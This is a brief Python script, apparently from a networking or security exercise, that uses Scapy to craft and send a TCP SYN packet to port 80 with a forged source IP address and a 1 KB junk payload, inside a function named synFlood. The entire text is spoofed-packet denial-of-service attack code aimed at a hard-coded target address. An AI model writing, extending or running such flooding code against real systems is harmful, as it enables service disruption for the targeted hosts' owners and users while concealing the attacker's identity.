from scapy.all import *

def synFlood(src,tgt):
    L3=IP(src=src,dst=tgt)
    L4=TCP(sport=RandShort(),dport=80, flags="S")
    raw = Raw(b"X"*1024)
    pkt=L3/L4/raw
    send(pkt)


src="10.2.0.2"
tgt="10.0.0.2"

synFlood(src,tgt)    